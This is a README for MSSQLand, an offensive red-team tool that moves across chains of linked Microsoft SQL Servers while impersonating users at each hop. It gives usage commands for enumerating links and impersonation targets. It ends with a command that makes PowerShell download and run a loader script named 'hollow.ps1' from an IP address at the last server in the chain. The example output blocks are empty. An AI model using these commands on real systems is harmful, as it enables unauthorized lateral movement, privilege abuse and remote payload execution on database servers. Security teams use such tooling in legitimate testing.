# MSSQLand
MSSQLand is your ultimate tool for interacting with Microsoft SQL Server (MSSQL) database management system (DBMS) in your red activities. It allows you to pave your way across multiple linked servers and impersonate anyone (authorised) on the road, popping out of the last hop with any desired action.

The tool's precise and structured output is surrounded by timestamps and enriched with useful information, making it perfect for capturing beautiful screenshots in your reports.

## Show Time üëë
The power of this tool is showable in a common use case that you can find in challenges, labs en enterprise-wide environments during your engagments. You gain access to a database `SQL01` as `user1`. Then you need to impersonate `user2` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `user3` in order to go further and so on and so forth.

Let's say you‚Äôve landed an agent inside a `sqlservr.exe` process running under the high-privileged `NT AUTHORITY\SYSTEM`. Lucky you! üéØ

After some reconnaissance, you suspect this is a multi-hop linked server chain. Typing out all those **RPC** or **OPENQUERY** calls manually? No thanks. Let MSSQLand  handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:

```shell
MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
```

The output is as follows:
```txt

Now you want to verify who you can impersonate at the end of the chain:
```shell
MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
```
The output shows:

```txt

Great! Now you can directly reach out to your loader with:
```shell
MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
```

And yes, all the outputted tables are Markdown friendly. What a kind gesture!

## Options and Features ‚öôÔ∏è

### Too Much Output?
Use the `/silent` switch for a streamlined experience. It minimizes output, showing only the action results, making it particularly useful for some engagements where less is more.

## Project Structure üìö

### `Actions`
This directory contains all the specific operations that MSSQLand can perform. Each action follows a modular design using the command pattern to encapsulate its logic, such as PowerShell execution, querying, impersonation, and more.

### `Services`
The backbone of the application, responsible for connection management, query execution, user management, and configuration handling.

### `Utilities`
Helper classes like Logger and MarkdownFormatter that make your life easier.

### `Models` Folder
Contains classes representing SQL Server entities, such as Server and LinkedServers.
